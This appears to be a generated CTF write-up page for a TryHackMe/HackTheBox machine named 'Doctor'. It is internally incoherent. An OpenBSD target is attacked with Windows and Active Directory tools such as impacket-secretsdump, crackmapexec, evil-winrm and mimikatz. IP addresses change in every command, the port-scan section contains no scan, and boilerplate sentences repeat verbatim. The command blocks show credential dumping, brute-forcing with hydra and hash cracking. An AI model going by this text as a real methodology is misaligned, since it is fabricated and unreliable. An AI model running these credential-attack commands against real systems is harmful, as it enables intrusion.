---
TitleSEO: "TryHackMe — Doctor (Hard OpenBSD) | ZureFX"
TitlePost: "TryHackMe — Doctor (Hard OpenBSD)"
Author: "ZureFX"
Description: "Full writeup for TryHackMe Doctor. SSTI and IDOR to achieve hard compromise on OpenBSD."
Keywords: "hard, easy, tryhackme, hackthebox"
URL: "https://zurefx.github.io/writeups/htb-doctor-527.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-doctor-527/"
Date: "2025-06-06"
Tags: "Hard, Easy, TryHackMe, HackTheBox"
Section: "writeups"
Lang: "en"
main_img: "htb-doctor-527"
Permalink: "/writeups/htb-doctor-527.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Doctor** is rated **Hard** on TryHackMe. It runs **OpenBSD** and the IP address during this analysis was `10.52.142.150`.

### Objectives

Privilege escalation was possible due to misconfigured sudo permissions. The kernel version was outdated and vulnerable to a publicly known exploit.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
evil-winrm -i 10.17.27.73 -u administrator -p 'P@ssw0rd!'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
evil-winrm -i 10.75.251.236 -u administrator -p 'P@ssw0rd!'
```

Lateral movement was facilitated by reusing discovered credentials across services. Unconstrained delegation was enabled on the compromised machine.

### Service Enumeration

The target system was identified as running a vulnerable version of the service. The web application was vulnerable to Server-Side Template Injection (SSTI). Weak file permissions allowed modification of critical system files.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
feroxbuster -h
crackmapexec smb 10.11.210.225 -u administrator -p 'P@ssw0rd!' --shares
```

The kernel version was outdated and vulnerable to a publicly known exploit. The kernel version was outdated and vulnerable to a publicly known exploit.

### SMB Enumeration

The service account had excessive permissions assigned in Active Directory. The kernel version was outdated and vulnerable to a publicly known exploit.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.128.152.215
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

Authentication bypass was achieved through careful manipulation of the login mechanism. Initial enumeration revealed several interesting open ports on the target. Post-exploitation enumeration revealed a path to domain administrator privileges.

## Exploitation

### Vulnerability Identification

The target system was identified as running a vulnerable version of the service. Privilege escalation was possible due to misconfigured sudo permissions. The backup files contained sensitive information that should not have been accessible.

Key finding: **IDOR**.

The web application was vulnerable to Server-Side Template Injection (SSTI). Initial enumeration revealed several interesting open ports on the target.

### Initial Access

The kernel version was outdated and vulnerable to a publicly known exploit. Network traffic analysis revealed unencrypted communications containing user credentials.

```bash
feroxbuster -h
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Post-exploitation enumeration revealed a path to domain administrator privileges. The application stored sensitive credentials in an unencrypted configuration file. The database credentials were hardcoded in the application source code.

## Privilege Escalation

### Enumeration

The backup files contained sensitive information that should not have been accessible. Lateral movement was facilitated by reusing discovered credentials across services. Post-exploitation enumeration revealed a path to domain administrator privileges.

```powershell
impacket-secretsdump administrator:'P@ssw0rd!'@10.93.130.254
crackmapexec smb 10.35.231.235 -u administrator -p 'P@ssw0rd!' --shares
crackmapexec smb 10.41.37.152 -u administrator -p 'P@ssw0rd!' --shares
gobuster dir -u http://10.38.231.172/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

### Exploitation

Weak file permissions allowed modification of critical system files. Command injection was possible through unsanitized user input in the search functionality.

```powershell
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.92.205.36 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
evil-winrm -i 10.66.85.63 -u administrator -p 'P@ssw0rd!'
```

The scheduled task ran with elevated privileges and could be abused for escalation. The scheduled task ran with elevated privileges and could be abused for escalation.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

The kernel version was outdated and vulnerable to a publicly known exploit. The target system was identified as running a vulnerable version of the service.

## Summary

### Tools Used

- `evil-winrm`
- `ffuf`
- `atexec`
- `mimikatz`
- `lookupsid`

### Key Takeaways

- SSTI
- IDOR
- ACL Abuse
